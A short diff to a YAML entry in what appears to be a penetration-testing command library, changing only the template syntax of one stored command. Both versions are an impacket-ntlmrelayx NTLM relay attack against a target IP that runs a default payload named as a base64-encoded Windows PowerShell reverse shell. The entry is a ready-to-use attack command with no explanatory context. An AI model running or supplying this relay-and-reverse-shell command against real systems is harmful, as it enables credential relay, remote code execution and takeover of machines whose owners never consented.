@@ -6,4 +6,4 @@ metadata:
   author: "Unknown"
 
 content: |
-  impacket-ntlmrelayx --no-http-server -smb2support -t <ip> -c "<%=${payload:-$(esh payloads/revshell-windows-powershell-oneliner-base64encoded)}%>"
+  impacket-ntlmrelayx --no-http-server -smb2support -t <ip> -c "{{ payload | default(include('payloads/revshell-windows-powershell-oneliner-base64encoded.yaml')) }}"
